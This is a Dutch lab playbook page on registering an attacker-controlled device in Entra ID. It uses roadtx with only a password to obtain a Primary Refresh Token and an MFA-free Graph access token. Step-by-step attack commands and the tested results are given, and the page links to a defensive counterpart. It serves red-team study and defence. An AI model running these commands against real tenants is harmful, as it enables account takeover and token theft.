---
title: "PB-01 Toestelregistratie en PRT"
nav_order: 1
parent: "Playbooks"
---

# PB-01 Toestelregistratie en PRT

| | |
|---|---|
| **Pad** | B, sub-aanpak 2 |
| **Doel** | Met alleen een wachtwoord een eigen toestel registreren en tokens verkrijgen |
| **Tooling** | roadtx |
| **Waar** | Attacker Windows |
| **Status** | Getest — geslaagd |
| **Verdediging** | [PB-07]({{ '/playbooks/pb-07-mfa-bij-registratie/' | relative_url }}) |

**Theorie.** Elke gebruiker mag standaard toestellen registreren in Entra ID. Een geregistreerd toestel krijgt een toestelcertificaat en een transportsleutel, en kan daarmee een PRT aanvragen. Een aanvaller die een wachtwoord kent, kan zo zelf een "toestel" aanmaken waarvan hij alle sleutels bezit.

**Startcondities.** Attacker Windows-VM, lokaal account `attacker`; account `28_tu_token` zonder MFA-eis; geen verdedigingspolicies actief. Datum: 21/10/2026.

**Uitvoering.**

```
# Stap 1: token voor de Device Registration Service
roadtx gettokens -u 28_tu_token@aplab.be -p '<wachtwoord>' -r devicereg

# Stap 2: toestel registreren in de tenant
roadtx device -a join -n attackerdevice

# Stap 3: PRT aanvragen voor het geregistreerde toestel
roadtx prt -u 28_tu_token@aplab.be -p '<wachtwoord>' --key-pem attackerdevice.key --cert-pem attackerdevice.pem

# Stap 4: access-token via PRT-authenticatie
roadtx prtauth -r https://graph.microsoft.com
```

**Resultaat.** `attackerdevice` verscheen in Entra admin center onder Devices, met besturingssysteem Windows. Er is een access-token voor Microsoft Graph verkregen zonder MFA en zonder toegang tot de victim.

**Waarom het slaagt.** De registratie vereiste in deze configuratie geen MFA, en de PRT wordt uitgegeven aan wie het toestelcertificaat en de transportsleutel bezit. Bij een zelf geregistreerd toestel is dat de aanvaller.

**Onderweg opgelost.** Een nieuw Entra-account heeft een tijdelijk wachtwoord dat eerst via `myaccount.microsoft.com` gewijzigd moet worden; roadtx ondersteunt die flow niet.
